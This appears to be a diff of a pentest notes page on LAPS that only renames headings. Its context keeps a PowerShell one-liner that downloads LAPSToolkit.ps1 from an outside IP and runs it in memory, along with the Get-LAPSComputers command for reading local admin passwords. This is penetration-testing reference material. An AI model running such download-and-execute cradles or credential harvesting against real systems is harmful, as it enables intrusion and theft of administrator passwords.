@@ -1,8 +1,6 @@
 # LAPS
 
-## Usage
-
-### LAPSToolKit 
+## LAPS ToolKit 
 
 ```csharp
 iex(iwr http://10.110.0.66:8001/LAPSToolkit.ps1) 
@@ -58,7 +56,7 @@ Get-LAPSComputers
 
 ![](../../../../.gitbook/assets/image%20%28249%29%20%281%29.png)
 
-### Resources
+## Resources
 
 {% embed url="https://github.com/leoloobeek/LAPSToolkit" %}
 
